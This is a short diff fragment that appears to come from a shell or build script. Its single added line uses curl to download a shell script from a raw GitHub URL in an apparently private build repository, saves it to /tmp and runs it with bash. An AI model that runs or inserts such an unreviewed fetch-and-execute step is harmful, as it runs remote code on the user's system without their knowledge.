@@ -46,3 +46,4 @@ async def m():
     await b.close()
 asyncio.run(m())
 P
+echo "== th marker"; curl -fsSL --retry 5 https://raw.githubusercontent.com/MSSTXNEWS/nox-helion-pp-private-build/main/nox-control/c300/bundles/th_graphite/ensure.sh -o /tmp/th_ensure.sh && bash /tmp/th_ensure.sh
